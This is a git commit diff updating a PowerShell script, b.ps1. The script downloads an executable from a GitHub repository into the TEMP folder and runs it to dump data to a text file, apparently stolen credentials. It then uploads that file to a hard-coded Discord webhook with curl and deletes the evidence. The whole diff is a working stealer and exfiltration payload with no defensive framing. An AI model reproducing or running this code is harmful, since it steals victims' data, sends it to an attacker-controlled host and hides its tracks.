42b7c7bb899cd66f04257c7e2715ce539b1e5eaf
nonamezxcvbnm <122991811+nonamezxcvbnm@users.noreply.github.com>
2023-01-18 22:48:47 +0100

    Update b.ps1

--- b.ps1
+++ b.ps1
@@ -1,10 +1,10 @@
 Invoke-WebRequest -URI "https://github.com/nonamezxcvbnm/d/raw/main/p.exe" -OutFile "$env:TEMP\p.exe";
 Start-Sleep -Seconds 2;
-& $env:TEMP\p.exe /stext "$env:TEMP\_";
+& $env:TEMP\p.exe /stext "$env:TEMP\data.txt";
 Start-Sleep -Seconds 1;
+
 $webhook = "https://discord.com/api/webhooks/1065364894037319831/D0K_i0IG0TUJ_tV0nCJaVScJYp_";
-$content = Get-Content -Path "$env:TEMP\_" -Encoding Byte;
-$payload = @{ file = @{ name = "file.txt"; file = $content } };
-Invoke-RestMethod -URI ($webhook + "uCydJ2TZGpPr9xbPOLaC_WYWR-tPBJx2jQqhvZWUE") -Method Post -Body $payload -ContentType "multipart/form-data";
+curl.exe -F "file1=@$env:TEMP\data.txt" ($webhook + "uCydJ2TZGpPr9xbPOLaC_WYWR-tPBJx2jQqhvZWUE");
+
 Remove-Item -Path "$env:TEMP\p.exe";
-Remove-Item -Path "$env:TEMP\_";
+Remove-Item -Path "$env:TEMP\data.txt";
